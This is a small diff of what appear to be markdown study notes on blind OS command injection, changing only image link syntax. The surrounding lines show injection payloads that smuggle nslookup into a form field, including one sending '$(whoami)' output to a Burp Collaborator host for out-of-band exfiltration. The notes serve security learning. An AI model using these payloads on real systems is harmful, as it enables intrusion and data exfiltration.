@@ -80,7 +80,7 @@ Example:
 ||nslookup gaui95zup775djzi3ivc73vzcqik69.burpcollaborator.net||
 ```
 
-![5af1b46d6cbb8f921c622492626fcc8e.png](../../_resources/5af1b46d6cbb8f921c622492626fcc8e-1.png)
+![[5af1b46d6cbb8f921c622492626fcc8e-1.png]]
 
 
 ## Blind injection, out-of-band exfiltration
@@ -92,4 +92,4 @@ Example:
 email=||nslookup $(whoami).86cqxrz7k5bt71be0bmo1qxbp2vtji.burpcollaborator.net||
 ```
 
-![0e3a6580220ed4383c02b620333de65d.png](../../_resources/0e3a6580220ed4383c02b620333de65d-1.png)
+![[0e3a6580220ed4383c02b620333de65d-1.png]]
